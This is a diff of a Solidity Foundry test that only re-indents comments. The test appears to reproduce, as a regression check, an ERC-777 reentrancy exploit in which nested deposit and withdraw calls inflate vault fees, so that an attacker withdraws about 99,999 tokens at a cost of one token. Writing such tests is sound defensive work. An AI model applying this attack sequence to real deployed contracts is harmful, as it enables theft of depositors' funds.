@@ -84,21 +84,21 @@ contract ReentrancyTest is IntegrationTest, IERC1820Implementer {
         vm.startPrank(attacker);
 
         registry.setInterfaceImplementer(attacker, TOKENS_SENDER_INTERFACE_HASH, address(this)); // Set test contract
-            // to receive ERC-777 callbacks.
+        // to receive ERC-777 callbacks.
         registry.setInterfaceImplementer(attacker, TOKENS_RECIPIENT_INTERFACE_HASH, address(this)); // Required "hack"
-            // because done all in a single Foundry test.
+        // because done all in a single Foundry test.
 
         reentrantToken.approve(address(vault), 100_000);
 
         vault.deposit(1, attacker); // Initial deposit of 1 token to be able to call withdraw(1) in the subcall
-            // before depositing(5000)
+        // before depositing(5000)
 
         vault.deposit(5_000, attacker); // Deposit 5000, withdraw 1 in the subcall. Total deposited 4999,
-            // lastTotalAssets only updated by +1.
+        // lastTotalAssets only updated by +1.
 
         vm.startPrank(attacker); // Have to re-call startPrank because contract was reentered. Hacky but works.
         vault.deposit(5_000, attacker); // Same as above. Accrue yield accrues 50% * (newTotalAssets -
-            // lastTotalAssets) = 50% * 4999 = ~2499. lastTotalAssets only updated by +1.
+        // lastTotalAssets) = 50% * 4999 = ~2499. lastTotalAssets only updated by +1.
 
         vm.startPrank(attacker);
         vault.deposit(5_000, attacker); // ~2499 tokens taken as fees.
@@ -110,11 +110,11 @@ contract ReentrancyTest is IntegrationTest, IERC1820Implementer {
 
         vm.startPrank(attacker);
         vault.withdraw(vault.maxWithdraw(attacker), attacker, attacker); // Withdraw 99_999 tokens, cost of attack
-            // = 1 token
+        // = 1 token
 
         vm.startPrank(FEE_RECIPIENT);
         vault.withdraw(vault.maxWithdraw(FEE_RECIPIENT), FEE_RECIPIENT, FEE_RECIPIENT); // Fee recipient withdraws
-            // 9_999 tokens, stolen from `SUPPLIER`
+        // 9_999 tokens, stolen from `SUPPLIER`
 
         console2.log("Attacker ending with %s tokens", reentrantToken.balanceOf(attacker)); // 99_999
         console2.log("Fee recipient ending with %s tokens", reentrantToken.balanceOf(FEE_RECIPIENT)); // 9_999
